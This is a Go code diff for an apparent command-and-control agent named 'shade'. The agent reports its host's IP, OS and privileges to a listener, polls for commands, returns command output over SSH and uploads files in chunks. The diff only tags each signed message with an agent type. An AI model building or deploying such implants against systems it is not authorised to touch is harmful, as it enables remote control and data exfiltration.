@@ -86,6 +86,7 @@ type AgentRegistration struct {
 	Name              string `json:"name"`
 	IP                string `json:"ip"`
 	OS                string `json:"os"`
+	AgentType         string `json:"agent_type,omitempty"`
 	ReconnectInterval int    `json:"reconnectInterval"`
 	Privileges        string `json:"privileges"`
 }
@@ -159,6 +160,7 @@ func connectAndServe(agentID, agentName, osInfo string) error {
 		Name:              agentName,
 		IP:                getLocalIP(),
 		OS:                osInfo,
+		AgentType:         "shade",
 		ReconnectInterval: reconnectInterval,
 		Privileges:        getPrivilegeInfo(),
 	}
@@ -174,10 +176,11 @@ func connectAndServe(agentID, agentName, osInfo string) error {
 
 	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
 	wrapper := map[string]interface{}{
-		"endpoint":  listenerEndpoint,
-		"data":      json.RawMessage(regData),
-		"timestamp": timestamp,
-		"signature": signature,
+		"agent_type": "shade",
+		"endpoint":   listenerEndpoint,
+		"data":       json.RawMessage(regData),
+		"timestamp":  timestamp,
+		"signature":  signature,
 	}
 
 	// Marshal the wrapper
@@ -229,10 +232,11 @@ func connectAndServe(agentID, agentName, osInfo string) error {
 
 		// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
 		wrapper := map[string]interface{}{
-			"endpoint":  listenerEndpoint,
-			"data":      json.RawMessage(pollData),
-			"timestamp": timestamp,
-			"signature": signature,
+			"agent_type": "shade",
+			"endpoint":   listenerEndpoint,
+			"data":       json.RawMessage(pollData),
+			"timestamp":  timestamp,
+			"signature":  signature,
 		}
 
 		// Marshal the wrapper
@@ -372,10 +376,11 @@ func sendCommandResponseSSH(client *ssh.Client, commandID int, output, status st
 
 	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
 	wrapper := map[string]interface{}{
-		"endpoint":  listenerEndpoint,
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
+		"agent_type": "shade",
+		"endpoint":   listenerEndpoint,
+		"data":       json.RawMessage(jsonData),
+		"timestamp":  timestamp,
+		"signature":  signature,
 	}
 
 	// Marshal the wrapper
@@ -816,10 +821,11 @@ func initiateChunkedTransferSSH(absPath, filename string, fileSize int64, totalC
 	timestamp, signature := signRequest("POST", listenerEndpoint, body)
 
 	wrapper := map[string]interface{}{
-		"endpoint":  listenerEndpoint,
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
+		"agent_type": "shade",
+		"endpoint":   listenerEndpoint,
+		"data":       json.RawMessage(jsonData),
+		"timestamp":  timestamp,
+		"signature":  signature,
 	}
 
 	finalData, err := json.Marshal(wrapper)
@@ -865,10 +871,11 @@ func uploadChunkSSH(sessionID string, chunkIndex int, chunkData []byte, chunkMD5
 	timestamp, signature := signRequest("POST", listenerEndpoint, body)
 
 	wrapper := map[string]interface{}{
-		"endpoint":  listenerEndpoint,
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
+		"agent_type": "shade",
+		"endpoint":   listenerEndpoint,
+		"data":       json.RawMessage(jsonData),
+		"timestamp":  timestamp,
+		"signature":  signature,
 	}
 
 	finalData, err := json.Marshal(wrapper)
@@ -912,10 +919,11 @@ func completeChunkedTransferSSH(sessionID string) error {
 	timestamp, signature := signRequest("POST", listenerEndpoint, body)
 
 	wrapper := map[string]interface{}{
-		"endpoint":  listenerEndpoint,
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
+		"agent_type": "shade",
+		"endpoint":   listenerEndpoint,
+		"data":       json.RawMessage(jsonData),
+		"timestamp":  timestamp,
+		"signature":  signature,
 	}
 
 	finalData, err := json.Marshal(wrapper)
